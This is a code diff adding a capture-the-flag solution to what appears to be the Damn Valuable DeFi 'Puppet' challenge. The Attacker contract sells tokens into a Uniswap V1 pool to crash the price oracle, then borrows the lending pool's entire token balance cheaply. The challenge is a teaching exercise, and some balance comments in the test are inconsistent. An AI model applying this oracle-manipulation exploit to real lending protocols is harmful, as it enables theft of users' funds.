@@ -92,7 +92,16 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+
+        // Tank uniswap pool to get favourable ratio 19.99 DVT : 0.01 ETH
+        //function getEthToTokenInputPrice(uint256 eth_sold) external returns (uint256 out);
+
+        Attacker atk = new Attacker{value: PLAYER_INITIAL_ETH_BALANCE}(address(token), address(lendingPool), address(uniswapV1Exchange), recovery);
+        token.transfer(address(atk), 999e18);
+        atk.attack(999e18);
+        // player should now have 
+        // eth: 25 + 9.99 = 34.99
+        // DVT: 1000 - 9.99 = 9990.99
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +124,50 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+contract Attacker {
+    
+    DamnValuableToken token;
+    PuppetPool lendingPool;
+    IUniswapV1Exchange uniswapV1Exchange;
+    address recovery;
+    constructor(address _token, address _lendingPool, address _uniswapV1Exchange, address _recovery) payable {
+        token = DamnValuableToken(_token);
+        lendingPool = PuppetPool(_lendingPool);
+        uniswapV1Exchange = IUniswapV1Exchange(_uniswapV1Exchange);
+        recovery = _recovery;
+    }
+
+    function attack(uint256 amount) external{
+        uint dvtbalance = token.balanceOf(address(this));
+        
+        console.log("Starting Deposit required for 100k: ",lendingPool.calculateDepositRequired(100_000e18));
+        //200000000000000000000000
+        //19.703326481183000000
+
+        // We want to bought more eth possible from Exchange in order to generate a favourable ratio DVT:ETH
+
+        token.approve(address(uniswapV1Exchange), dvtbalance);
+        uniswapV1Exchange.tokenToEthTransferInput(dvtbalance, 1, block.timestamp, address(this));
+
+        // emit EthPurchase(buyer: Attacker: [], tokens_sold: 999000000000000000000 [9.99e20], eth_bought: 9900596717902431702 [9.9e18])
+
+        console.log("DVT balance after attack: ", token.balanceOf(address(this)));
+        console.log("ETH balance after attack: ", address(this).balance);
+
+        // 4.992488733099649474
+        //29.992488733099649474
+
+        console.log("Deposit required for 100k: ",lendingPool.calculateDepositRequired(100_000e18));
+
+        lendingPool.borrow{value: lendingPool.calculateDepositRequired(100_000e18)}(100_000e18, address(this));
+
+        console.log("DVT balance after borrow: ", token.balanceOf(address(this)));
+        //100000.000000000000000000
+
+        token.transfer(recovery, token.balanceOf(address(this)));
+    
+    }
+    receive() external payable{}
 }
